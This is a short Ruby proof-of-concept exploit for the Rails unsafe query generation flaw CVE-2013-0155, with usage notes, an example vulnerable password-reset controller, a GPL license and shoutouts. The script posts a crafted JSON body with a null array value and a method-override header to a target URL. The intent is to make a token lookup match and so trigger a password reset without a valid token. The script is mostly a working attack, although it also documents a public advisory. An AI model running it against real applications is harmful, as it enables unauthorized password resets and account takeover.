#!/usr/bin/env ruby

#

# Proof-of-Concept exploit for Rails Unsafe Query Generation (CVE-2013-0155)

#

# ## Advisory

#

# https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/t1WFuuQyavI

#

# ## Synopsis

#

# $ rails_jsonq.rb HOST PARAM

#

# ## Dependencies

#

# $ gem install ronin-support

#

# ## Example

#

# $ rails_jsonq.rb http://localhost:3000/users/reset_password token

#

# ### config/routes.rb

#

# resources :users do

# collection do

# post :reset_password

# end

# end

#

# ### app/controllers/users_controller.rb

#

# def reset_password

# if (@user = User.find_by_token(params[:token]))

# @user.reset_password!

#

# render :json => 'Success'

# else

# render :json => 'Failure'

# end

# end

#

# ## License

#

# Copyright (c) 2013 Postmodern

#

# This exploit is free software: you can redistribute it and/or modify

# it under the terms of the GNU General Public License as published by

# the Free Software Foundation, either version 3 of the License, or

# (at your option) any later version.

#

# This exploit is distributed in the hope that it will be useful,

# but WITHOUT ANY WARRANTY; without even the implied warranty of

# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the

# GNU General Public License for more details.

#

# You should have received a copy of the GNU General Public License

# along with this exploit. If not, see <http://www.gnu.org/licenses/>.

#

# ## Shoutz

#

# drraid, cd, px, sanitybit, sysfail, trent, dbcooper, goldy, coderman, letch,

# starik, toby, jlt, HockeyInJune, cloud, zek, natron, amesc, postmodern,

# mephux, nullthreat, evoltech, flatline, r0bglesson, @ericmonti, @charliesome,

# @homakov, @envygeek, @chendo, @tenderlove (for fixing it), Fun Town Auto,

# garbage pail kids, hipsters, the old Jolly Inn, Irvin Santiago,

# that heavy metal dude who always bummed cigarettes off us,

# SophSec crew and affiliates.

#

 

require 'ronin/network/http'

require 'ronin/ui/output'

require 'json'

 

include Ronin::Network::HTTP

include Ronin::UI::Output::Helpers

 

unless ARGV.length == 2

$stderr.puts "usage: #{$0} URL PARAM"

exit -1

end

 

url = ARGV[0]

param = ARGV[1]

 

json = {param => [nil]}.to_json

 

print_info "POSTing #{json} to #{url} ..."

 

response = http_post(

:url => url,

:headers => {

:content_type => 'application/json',

:x_http_method_override => 'get'

},

:body => json

)

 

print_debug "Received #{response.code} response"

 

case response.code

when '200' then print_info "Success!"

when '404' then print_error "Not found"

when '500' then print_error "Error!"

end
